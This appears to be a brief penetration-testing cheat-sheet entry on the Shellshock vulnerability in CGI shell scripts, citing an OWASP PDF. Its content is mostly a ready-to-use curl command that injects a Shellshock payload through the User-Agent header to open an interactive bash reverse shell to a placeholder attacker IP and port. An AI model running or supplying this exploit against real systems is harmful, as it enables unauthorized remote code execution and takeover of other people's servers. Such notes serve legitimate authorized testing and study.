### Shellshock
`.sh` files hosted in /cgi-bin may be vulnerable to shellshock

```
curl -H "User-Agent:() { :;};/bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1" <url>/cgi-bin/<.sh script>
```

https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf
